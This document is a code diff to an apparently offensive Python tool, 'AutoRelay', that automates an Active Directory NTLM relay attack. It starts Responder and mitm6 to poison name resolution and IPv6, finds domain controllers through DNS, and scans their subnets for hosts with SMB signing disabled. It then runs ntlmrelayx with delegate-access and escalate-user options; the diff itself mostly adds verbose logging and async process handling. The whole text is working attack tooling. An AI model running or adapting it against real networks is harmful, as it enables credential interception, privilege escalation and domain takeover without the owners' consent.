@@ -18,7 +18,7 @@ from netaddr import IPNetwork, AddrFormatError
 from pathlib import Path
 
 class AutoRelay:
-    def __init__(self, domain, interface=None):
+    def __init__(self, domain, interface=None, verbose=False):
         self.domain = domain
         self.interface = interface or self.get_default_interface()
         self.local_ip = self.get_local_ip()
@@ -28,6 +28,7 @@ class AutoRelay:
         self.temp_dir = tempfile.mkdtemp()
         self.log_dir = Path('logs')
         self.log_dir.mkdir(exist_ok=True)
+        self.verbose = verbose
 
     def get_default_interface(self):
         try:
@@ -47,9 +48,21 @@ class AutoRelay:
         """Kill processes by name"""
         try:
             for name in process_names:
+                if self.verbose:
+                    print_info(f"Killing process: {name}")
                 subprocess.run(['pkill', '-f', name], stderr=subprocess.DEVNULL)
         except Exception as e:
             print_bad(f"Error killing processes: {e}")
+
+    async def read_process_output(self, proc, name):
+        """Continuously read and display process output"""
+        while True:
+            line = await proc.stdout.readline()
+            if not line:
+                break
+            line = line.decode().strip()
+            if line:
+                print_info(f"[{name}] {line}")
 
     async def setup_services(self):
         """Setup and start required services"""
@@ -61,6 +74,8 @@ class AutoRelay:
             # Configure Responder
             responder_conf = Path('/usr/share/responder/Responder.conf')
             if responder_conf.exists():
+                if self.verbose:
+                    print_info("Reading Responder configuration")
                 config_data = responder_conf.read_text()
                 config_data = re.sub(r'SMB = On', 'SMB = Off', config_data)
                 config_data = re.sub(r'HTTP = On', 'HTTP = Off', config_data)
@@ -70,12 +85,18 @@ class AutoRelay:
             # Start Responder
             resp_cmd = f"responder -I {self.interface} -w -d"
             print_info(f"Starting Responder: {resp_cmd}")
-            resp_proc = Popen(resp_cmd.split(), stdout=PIPE, stderr=PIPE)
-            if resp_proc.poll() is None:
+            resp_proc = await asyncio.create_subprocess_exec(
+                *resp_cmd.split(),
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            if resp_proc.returncode is None:
                 self.processes.append(resp_proc)
                 print_good("Responder started successfully")
+                if self.verbose:
+                    asyncio.create_task(self.read_process_output(resp_proc, "Responder"))
             else:
-                _, stderr = resp_proc.communicate()
+                _, stderr = await resp_proc.communicate()
                 print_bad(f"Failed to start Responder: {stderr.decode()}")
 
             await asyncio.sleep(2)
@@ -83,12 +104,18 @@ class AutoRelay:
             # Start mitm6
             mitm6_cmd = f"mitm6 -d {self.domain} -i {self.interface}"
             print_info(f"Starting mitm6: {mitm6_cmd}")
-            mitm6_proc = Popen(mitm6_cmd.split(), stdout=PIPE, stderr=PIPE)
-            if mitm6_proc.poll() is None:
+            mitm6_proc = await asyncio.create_subprocess_exec(
+                *mitm6_cmd.split(),
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            if mitm6_proc.returncode is None:
                 self.processes.append(mitm6_proc)
                 print_good("mitm6 started successfully")
+                if self.verbose:
+                    asyncio.create_task(self.read_process_output(mitm6_proc, "mitm6"))
             else:
-                _, stderr = mitm6_proc.communicate()
+                _, stderr = await mitm6_proc.communicate()
                 print_bad(f"Failed to start mitm6: {stderr.decode()}")
 
             return True
@@ -97,48 +124,61 @@ class AutoRelay:
             print_bad(f"Error setting up services: {e}")
             return False
 
+    async def run_cmd(self, cmd):
+        """Run command and capture output"""
+        if self.verbose:
+            print_info(f"Running command: {cmd}")
+        proc = await asyncio.create_subprocess_shell(
+            cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await proc.communicate()
+        if self.verbose and stderr:
+            print_bad(f"Command stderr: {stderr.decode()}")
+        return stdout.decode(), stderr.decode(), proc.returncode
+
     async def scan_host(self, ip):
         """Scan single host for SMB signing"""
         try:
-            # Try nmap first
-            cmd = f"nmap -n -sS -p445 --script smb-security-mode {ip} -Pn"
-            proc = await asyncio.create_subprocess_shell(
-                cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            stdout, _ = await proc.communicate()
-            output = stdout.decode()
-            
-            if "message_signing: disabled" in output:
-                print_good(f"Found relay target via nmap: {ip}")
-                return ip
+            if self.verbose:
+                print_info(f"Scanning host: {ip}")
 
-            # Try smbclient as backup
-            if "445/tcp open" in output:
+            # Try nmap
+            cmd = f"nmap -n -sS -p445 --script smb-security-mode {ip} -Pn"
+            stdout, stderr, code = await self.run_cmd(cmd)
+            
+            if code == 0:
+                if "message_signing: disabled" in stdout:
+                    print_good(f"Found relay target via nmap: {ip}")
+                    return ip
+                elif self.verbose:
+                    print_info(f"SMB signing enabled or unreachable: {ip}")
+
+            # Try smbclient if port is open
+            if "445/tcp open" in stdout:
                 cmd = f"smbclient -L //{ip} -N -g"
-                proc = await asyncio.create_subprocess_shell(
-                    cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE
-                )
-                stdout, _ = await proc.communicate()
+                stdout, stderr, code = await self.run_cmd(cmd)
                 
-                if proc.returncode == 0:
+                if code == 0:
                     print_good(f"Found accessible SMB target: {ip}")
                     return ip
+                elif self.verbose:
+                    print_info(f"SMB access denied or error: {ip}")
 
         except Exception as e:
-            if "10.85" in str(ip):  # Only print errors for target subnet
-                print_bad(f"Error scanning {ip}: {e}")
+            print_bad(f"Error scanning {ip}: {e}")
         return None
 
     async def discover_dcs(self):
         """Find domain controllers using DNS"""
         try:
+            if self.verbose:
+                print_info(f"Starting DC discovery for domain: {self.domain}")
+            
             resolver = dns.resolver.Resolver()
             resolver.lifetime = 3
-            seen_dcs = set()  # Track unique DCs
+            seen_dcs = set()
             
             queries = [
                 f'_ldap._tcp.dc._msdcs.{self.domain}',
@@ -147,10 +187,14 @@ class AutoRelay:
             ]
             
             for query in queries:
+                if self.verbose:
+                    print_info(f"Querying DNS: {query}")
                 try:
                     answers = resolver.resolve(query, 'SRV')
                     for answer in answers:
                         dc_hostname = str(answer.target).rstrip('.')
+                        if self.verbose:
+                            print_info(f"Found DC hostname: {dc_hostname}")
                         try:
                             dc_ips = resolver.resolve(dc_hostname, 'A')
                             for ip in dc_ips:
@@ -159,10 +203,12 @@ class AutoRelay:
                                     seen_dcs.add(ip_str)
                                     self.dcs.add(ip_str)
                                     print_good(f'Found DC: {dc_hostname} ({ip})')
-                        except Exception:
-                            continue
-                except Exception:
-                    continue
+                        except Exception as e:
+                            if self.verbose:
+                                print_bad(f"Error resolving DC IP: {e}")
+                except Exception as e:
+                    if self.verbose:
+                        print_bad(f"Error querying DNS: {e}")
 
             if self.dcs:
                 print_good(f"Found {len(self.dcs)} Domain Controllers")
@@ -178,34 +224,52 @@ class AutoRelay:
         tasks = []
         
         for ip in IPNetwork(subnet):
-            if str(ip).endswith('.0') or str(ip).endswith('.255'):
+            ip_str = str(ip)
+            if ip_str.endswith('.0') or ip_str.endswith('.255'):
                 continue
-            tasks.append(self.scan_host(str(ip)))
+            tasks.append(self.scan_host(ip_str))
 
         if tasks:
-            chunk_size = 25  # Reduced chunk size
+            chunk_size = 25
             for i in range(0, len(tasks), chunk_size):
+                if self.verbose:
+                    print_info(f"Scanning chunk {i//chunk_size + 1} of {len(tasks)//chunk_size + 1}")
                 chunk = tasks[i:i + chunk_size]
                 results = await asyncio.gather(*chunk)
                 for result in results:
                     if result:
                         self.relay_targets.add(result)
-                await asyncio.sleep(0.5)  # Brief pause between chunks
+                await asyncio.sleep(0.5)
+
+    async def start_ntlmrelayx(self, targets_file):
+        """Start ntlmrelayx with monitoring"""
+        cmd = (f"ntlmrelayx.py -tf {targets_file} --smb2support "
+               f"--delegate-access --escalate-user")
+        print_info(f"Starting ntlmrelayx: {cmd}")
+        
+        proc = await asyncio.create_subprocess_exec(
+            *cmd.split(),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        
+        self.processes.append(proc)
+        if self.verbose:
+            asyncio.create_task(self.read_process_output(proc, "ntlmrelayx"))
+        
+        return proc
 
     async def auto_relay(self):
         """Run the full auto relay chain"""
         try:
-            # Setup services
             if not await self.setup_services():
                 return
 
-            # Discover DCs
             await self.discover_dcs()
             if not self.dcs:
                 print_bad("No Domain Controllers found")
                 return
 
-            # Get unique subnets
             subnets = set()
             for dc in self.dcs:
                 try:
@@ -216,24 +280,16 @@ class AutoRelay:
                 except Exception as e:
                     print_bad(f'Error processing subnet: {str(e)}')
 
-            # Scan subnets
             for subnet in subnets:
                 await self.scan_subnet(subnet)
 
             if self.relay_targets:
                 print_good(f"Found {len(self.relay_targets)} relay targets")
                 
-                # Write targets
                 targets_file = Path(f"{self.temp_dir}/targets.txt")
                 targets_file.write_text('\n'.join(self.relay_targets))
                 
-                # Start ntlmrelayx
-                cmd = (f"ntlmrelayx.py -tf {targets_file} --smb2support "
-                      f"--delegate-access --escalate-user")
-                print_info(f"Starting ntlmrelayx: {cmd}")
-                
-                ntlmrelay_proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
-                self.processes.append(ntlmrelay_proc)
+                ntlmrelay_proc = await self.start_ntlmrelayx(targets_file)
                 
                 print_info("Attack chain running. Press Ctrl+C to stop...")
                 while True:
@@ -265,6 +321,7 @@ def parse_args():
     parser.add_argument("-d", "--domain", required=True, help="Domain to attack (e.g. domain.local)")
     parser.add_argument("-i", "--interface", help="Network interface to use")
     parser.add_argument("--auto", action="store_true", help="Enable automatic attack chain")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
     return parser.parse_args()
 
 def print_bad(msg):
@@ -284,7 +341,7 @@ async def main():
         sys.exit(1)
 
     if args.auto:
-        relay = AutoRelay(args.domain, args.interface)
+        relay = AutoRelay(args.domain, args.interface, args.verbose)
         await relay.auto_relay()
     else:
         print_bad("Please use --auto for automatic attack chain")
